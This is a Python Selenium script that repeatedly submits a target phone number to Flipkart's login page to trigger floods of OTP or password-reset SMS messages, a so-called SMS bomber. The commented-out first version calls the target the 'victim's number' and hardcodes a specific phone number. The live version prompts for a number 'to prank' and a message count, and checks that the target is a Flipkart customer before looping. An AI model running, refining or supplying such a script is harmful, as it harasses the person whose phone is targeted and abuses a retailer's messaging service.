'''
from selenium import webdriver 
import time 
  
# create instance of Chrome webdriver 
browser = webdriver.Chrome(executable_path='/Users/sidchiku9/Downloads/chromedriver') 
  
# set the frequency of sms 
frequency = 10
  
# target mobile number, change it to victim's number and 
# also ensure that it's registered on flipkart 
mobile_number ="8839757897"
  
for i in range(frequency): 
    browser.get('https://www.flipkart.com/account/login?ret =/') 
  
    # find the element where we have to  
    # enter the number using the class name 
    number = browser.find_element_by_class_name('_2zrpKA _1dBPDZ') 
  
    # automatically type the target number 
    number.send_keys("8839757897") 
      
    # find the element to send a forgot password 
    # request using it's class name 
    forgot = browser.find_element_by_class_name('_21JmK0 _1__46T') 
      
    # clicking on that element 
    forgot.click() 
      
    # set the interval to send each sms 
    time.sleep(10) 
      
# Close the browser 
browser.quit() 
'''

import time
import unittest
from selenium import webdriver
msgtimes=int(input("Enter the number of times to send message:")) #Enter the number of time to seend the message
num=str(input("Enter the number to prank:"))                      #Enter the mobile number of Flipkart user
if(len(num)!=10):
        print("Please Enter the Valid Number")                    #Check if the Mobile Number is 10-digit
        quit()
for i in range(1,msgtimes+1):
        driver=webdriver.Chrome(executable_path='/Users/sidchiku9/Downloads/chromedriver')            #Place the localtion of your Chrome Driver
        driver.get('https://www.flipkart.com/account/login?ret=/')
        username=driver.find_element_by_xpath("//*[@id='container']/div/div[3]/div/div[2]/div/form/div[1]/input")       #Find the Enter Mobile Number Field
        username.send_keys(num)                                                                                         #Enter the num in the mobile number field
        otp=driver.find_element_by_xpath("//*[@id='container']/div/div[3]/div/div[2]/div/form/div[4]/button")           #Find the Request Otp option         
        otp.click()                                                                                                     #Click the option
        time.sleep(1) 
        if('Existing User? Log in' in driver.page_source):                                                              #Check if it is a Flipkart Customer or not
                print("Not a Flipkart Customer")
                driver.close()                                                                                                  
                driver.quit()
                break
        
        driver.close()                                                                                                  #Close the browser                                                                                                 
        driver.quit()    